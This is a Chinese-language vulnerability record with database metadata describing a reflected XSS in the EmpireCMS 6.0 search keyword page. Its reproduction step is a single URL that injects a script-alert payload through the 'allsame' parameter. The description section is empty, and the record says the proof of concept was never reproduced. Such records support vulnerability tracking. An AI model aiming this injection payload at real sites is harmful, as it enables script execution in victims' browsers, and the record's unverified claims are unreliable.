---
source: "hatch 补库批 20260928"
product: "EmpireCMS6.0"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "EmpireCMS 6.0 搜索框xss"
prerequisites: "来源所述条件，未列明部分仍待核：搜索关键字页存在并反射allsame；访问受害者浏览器"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-88204b197329afa897fb2658"
entity_id: "ve-88204b197329afa897fb2658"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：搜索关键字页存在并反射allsame；访问受害者浏览器

- **证据待核（1）**：只有一个URL，简介/来源/响应上下文/执行证据均缺；未说明URL编码与受影响构建。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# EmpireCMS 6.0 搜索框xss

一、漏洞简介
------------

二、漏洞影响
------------

EmpireCMS 6.0

三、复现过程
------------

    https://www.0-sec.org/search/keyword/index.php?allsame=3"><script>alert(/zerosec/)</script>
